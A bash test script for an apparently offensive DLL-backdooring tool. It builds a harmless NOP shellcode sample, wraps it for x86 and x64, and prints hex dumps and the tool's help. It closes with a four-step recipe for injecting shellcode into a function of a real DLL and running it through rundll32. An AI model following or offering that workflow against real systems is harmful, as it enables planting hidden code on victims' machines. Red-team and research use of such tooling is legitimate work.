#!/bin/bash
# Example test script demonstrating the DLL function backdoor workflow

echo "=== DLL Function Backdoor - Test Example ==="
echo ""

# Create a simple test shellcode (NOP sled + ret)
echo "[*] Creating test shellcode..."
printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90' > test_payload.bin
echo "[+] Test payload created (10 NOPs)"

# Test the shellcode wrapper
echo ""
echo "[*] Testing shellcode wrapper (x86)..."
python3 shellcode-wrapper.py -i test_payload.bin -o wrapped_x86.bin -a x86 -w full
echo ""

echo "[*] Testing shellcode wrapper (x64)..."
python3 shellcode-wrapper.py -i test_payload.bin -o wrapped_x64.bin -a x64 -w full
echo ""

# Show the hex dump of wrapped shellcode
echo "[*] Hex dump of x86 wrapped shellcode:"
xxd wrapped_x86.bin | head -n 5
echo ""

echo "[*] Hex dump of x64 wrapped shellcode:"
xxd wrapped_x64.bin | head -n 5
echo ""

# Test the dll-function-backdoor help
echo "[*] Testing dll-function-backdoor.py help..."
python3 dll-function-backdoor.py --help | head -n 20
echo ""

echo "[+] Test complete!"
echo ""
echo "To backdoor a real DLL, use:"
echo "  1. python3 dll-function-backdoor.py --dll target.dll --list"
echo "  2. python3 shellcode-wrapper.py -i payload.bin -o wrapped.bin -a x64 -w full"
echo "  3. python3 dll-function-backdoor.py -d target.dll -f FunctionName -s wrapped.bin -o backdoor.dll"
echo "  4. rundll32.exe backdoor.dll,FunctionName"

# Cleanup
rm -f test_payload.bin wrapped_x86.bin wrapped_x64.bin
